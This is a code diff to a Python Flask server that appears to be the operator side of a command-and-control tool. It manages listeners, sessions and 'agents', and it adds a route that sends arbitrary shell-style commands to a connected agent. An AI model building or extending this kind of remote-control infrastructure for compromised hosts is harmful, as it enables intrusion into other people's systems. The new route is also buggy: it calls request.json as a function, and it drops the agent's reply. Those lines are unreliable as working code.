@@ -1,8 +1,8 @@
 from lib import vglobals
-from hadler import run as handler_run
+from hadler import BUFFER, run as handler_run
+from lib.sthread import Sthread
 
 from flask import Flask, request, jsonify
-from multiprocessing import Process
 from hashlib import sha256
 from uuid import uuid4
 
@@ -33,7 +33,7 @@ def login():
     return session_uuid
 
 
-@app.route("/get_agents/<session>")  # type: ignore
+@app.route("/get_agents/<session>")
 def get_agents(session: str):
     agents = []
 
@@ -60,25 +60,46 @@ def add_listener():
     listener_type = request.json["type"]
 
     vglobals.refresh_available_listeners()
-    if not listener_type in vglobals.LISTENERS_AVAILABLE:
+    if not listener_type in vglobals.listeners_available:
         return "Invalid listener type", 403
 
-    listener_name = request.json["name"]
-    listener_ip = request.json["ip"]
-    listener_port = request.json["port"]
+    listener_name: str = request.json["name"]
+    listener_ip: str = request.json["ip"]
+    listener_port: str = request.json["port"]
 
     vglobals.listeners[listener_name] = {}
     vglobals.listeners[listener_name]["ip"] = listener_ip
     vglobals.listeners[listener_name]["port"] = listener_port
     vglobals.listeners[listener_name]["type"] = listener_type
 
-    listener_process = Process(target=handler_run, args=(
+    listener_thread = Sthread(target=handler_run, args=(
         listener_ip, listener_port, listener_type))
 
-    vglobals.LISTENERS_PROCESSES[listener_name] = listener_process
+    vglobals.listeners_threads[listener_name] = listener_thread
 
     return jsonify(True)
 
+@app.route("/send_command", methods=["POST"])
+def send_command(): # TODO: send command to agent, open websocket, send response and close  
+    if request.json is None:
+        return "JSON body is none", 500
+
+    session: str = request.json["auth"]
+
+    if not session in list(vglobals.clients_session.values()):
+        return "Invalid session ID", 401
+    
+    target_id: str = request.json("target")
+    command: str = request.json("cmd")
+
+    if not target_id in vglobals.agents:
+        return "Agent not found", 500
+    
+    agent = vglobals.agents[target_id]
+
+    agent.send(command.encode())
+    agent.recv(BUFFER)
+    return ""
 
 def run(ip: str, port: int, ssl=False, ssl_context=()):
     if ssl:
